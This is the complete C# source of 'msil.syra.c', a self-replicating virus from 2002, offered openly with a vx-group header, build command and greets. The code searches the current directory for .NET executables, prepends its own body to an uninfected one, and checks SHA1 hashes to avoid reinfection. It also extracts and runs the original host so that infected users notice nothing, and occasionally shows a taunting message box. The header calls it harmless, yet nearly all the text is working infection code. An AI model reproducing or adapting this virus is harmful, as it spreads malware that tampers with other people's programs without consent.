   //////////////////////////////
   /////// syra.c //////////////
   ////////////////////////////

   //// msil.syra history
   ////
   ////  version a - prepends itself to w32 pe exe and msil exe files in current directory. inserts four byte marker
   ////              at the end of infected files. original hosts are regenerated to a single hardcoded file...
   ////
   ////  version b - prepends itself to msil exe files only in current directory. inserts four byte marker at the end
   ////              of infected files. original hosts are regenerated to a single hardcoded file...
   ////
   ////  syra.c prepends itself to msil exe files only in current directory. instead of inserting a four byte marker to
   ////  infected files, it uses SHA1 for anti-host reinfection and anti-self infection. original hosts are regenerated to
   ////  multiple files, so infected users won't know that there's something wrong with their dotnet files..
   ////
   ////  compilation :
   ////
   ////  csc /target:winexe thisfile
   ////
   ////
   ////  enjoy,
   ////
   ////  alcopaul
   ////  brigada ocho & rrlf
   ////  september 30, 2002
   ////
   ////  http://alcopaul.host.sk
   ////  alcopaulvx@yahoo.com
   ////
   ////  greets
   ////
   ////  brigada ocho (let us be THE HLL group.. :) )
   ////  rrlf (my home when i was lamer than lame)
   ////  philie (hehehe, what can i say, you adopted me when i was newbie)
   ////  slagehammer (thanks for the guidance when i was a newbie)
   ////  jackie (thanks for appreciating my work. one of my vx inspiration)
   ////  virusbuster (thanks for the avp.key, man.. and i hope you'll publish my contributions in 29a#7.. :) )
   ////  energy (let us always make projects together)
   ////  petik (come back! :) )
   ////  arkhangel (thanks for hosting our page)
   ////  herm1t (same as arkhangel's message)
   ////  secuxp (nihau!)
   ////  perrun fans and critics (the true jpeg virus will come out in the future. just ask microsoft..)
   ////  my fans (if any) (thanks for appreciating my works)
   ////  vxers (let us all explore the robust world of dotnet)
   ////
   ////
   ////
   ////
   //////////////////////////////////// warning : this is a harmless virus source code /////////////////////////////////////////

   using System;
   using System.IO;
   using System.Reflection;
   using System.Runtime.InteropServices;
   using System.Text;
   using System.Security.Cryptography;

   class msil_syra_c
   {
      public class w32api // i'm using the dotnet sdk in windows me (heheheh) so i can't call some essential dotnet classes at development :(
      {
      [DllImport("shell32.dll", CharSet=CharSet.Auto)]
      public static extern int ShellExecute(int hWnd, String oper, String file, String param, String dir, int type);
      [DllImport("user32.dll", CharSet=CharSet.Auto)]
      public static extern int MessageBox(int hWnd, String text, String caption, uint type);
      }
      public static void Main(String[] args)
      {
      Module self = Assembly.GetExecutingAssembly().GetModules()[0]; // thanks to Reflection
      string[] hostfiles = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe"); // gather the hostesses
      foreach (string hostfile in hostfiles){
      try
      {
      AssemblyName.GetAssemblyName(hostfile); // check if msil using managed seh
      // msil file then examine for previous infection using SHA1
      if (Sha1(self.FullyQualifiedName)==Sha1(hostfile)) // get sha1
      continue;
      else
      try
      {
      Infect(hostfile); // the meat of the routine
      }
      catch
      {
      continue; // error infecting file (maybe it's running/readonly/etc.) .. goto next file
      }
      break; // end after 1 infection
      }
      catch
      {
      continue; // dotnot, next file
      }
      }
      // extract host bytes from itself
      FileStream fs1 = new FileStream(self.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
      BinaryReader r1 = new BinaryReader(fs1);
      int host = (int) fs1.Length;
      int vir = host - 5632;
      r1.BaseStream.Seek(5632, SeekOrigin.Begin);
      byte[] bytes = new byte[vir];
      int numBytesToRead = vir;
      int numBytesRead = 0;
      while (numBytesToRead > 0)
      {
      int n = r1.Read(bytes, numBytesRead, numBytesToRead);
      if (n==0)
      break;
      numBytesRead += n;
      numBytesToRead -= n;
      }
      r1.Close();
      // save host to file
      Random ran = new Random();
      int ty = ran.Next(2000);
      FileStream fs11 = new FileStream("p" + ty + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
      BinaryWriter w1 = new BinaryWriter(fs11);
      w1.BaseStream.Seek(0, SeekOrigin.Begin);
      w1.Write(bytes);
      w1.Close();
      string rect = Directory.GetCurrentDirectory();
      // execute host
      w32api.ShellExecute(0, null, "p" + ty + "h.exe", null, rect, 1);
      // use SEH to wait for host to terminate and delete it
      wet:
      try
      {
      File.Delete("p" + ty + "h.exe");
      }
      catch
      {
      goto wet;
      }
      if (File.Exists("p" + ty + "h.exe")==true)
      goto wet;
      // display messagebox (25% probability)
      Random t = new Random();
      if (t.Next(4)==3)
      w32api.MessageBox(0, "::::only SHA1gging .NET files::::", "msil.syra.c by alcopaul", 0);
      }
      public static void Infect(string host)
      {
        // read self
        Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
        FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
        BinaryReader r = new BinaryReader(fs);
        r.BaseStream.Seek(0, SeekOrigin.Begin);
        byte[] bytes = new byte[5632];
        int numBytesToRead = (int) 5632;
        int numBytesRead = 0;
        while (numBytesToRead > 0)
        {
        int n = r.Read(bytes, numBytesRead, numBytesToRead);
        if (n==0)
        break;
        numBytesRead += n;
        numBytesToRead -= n;
         }
        r.Close();
        // read host
        FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
        BinaryReader w33 = new BinaryReader(fs133);
        w33.BaseStream.Seek(0, SeekOrigin.Begin);
        byte[] bytes2 = new byte[fs133.Length];
        int numBytesToRead2 = (int) fs133.Length;
        int numBytesRead2 = 0;
        while (numBytesToRead2 > 0)
        {
        int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
        if (n==0)
        break;
        numBytesRead2 += n;
        numBytesToRead2 -= n;
        }
        w33.Close();
        // save self + host to hostfile
        FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
        BinaryWriter w = new BinaryWriter(fs1);
        w.BaseStream.Seek(0, SeekOrigin.Begin);
        w.Write(bytes);
        w.Write(bytes2);
        w.Close();
        }
      public static string Sha1(string data) // get SHA1 of first 2048 bytes of input file
      {
      // why 2048? 2048 is the minimun file size that ilasm produces... we don't want some errors to happen here, ei!
      FileStream FSsha = new FileStream(data, FileMode.OpenOrCreate, FileAccess.Read);
      BinaryReader BRsha = new BinaryReader(FSsha);
      BRsha.BaseStream.Seek(0, SeekOrigin.Begin);
      byte[] Bsha = new byte[2048];
      int B2R = 2048;
      int BR = 0;
      while (B2R > 0)
      {
      int n1 = BRsha.Read(Bsha, BR, B2R);
      if (n1==0)
      break;
      BR += n1;
      B2R -= n1;
      }
      BRsha.Close();
      SHA1 sha = new SHA1CryptoServiceProvider();
      byte[] result = sha.ComputeHash(Bsha); // result contains the SHA1 byte represention of the 2048 input data
      return BytesToHexString(result); // we need to convert that byte rep to hex rep..
      }
      static String BytesToHexString(byte[] bytes) // excerpt from http://support.microsoft.com/default.aspx?scid=kb;en-us;Q312906
      {                        // antivirus companies must thank virus writers and we, virus writers must
                           // thank microsoft.. :)
      StringBuilder hexString = new StringBuilder(64);
      for (int counter = 0; counter < bytes.Length; counter++)
      {
      hexString.Append(String.Format("{0:X2}", bytes[counter]));
      }
      return hexString.ToString();
      }
   }
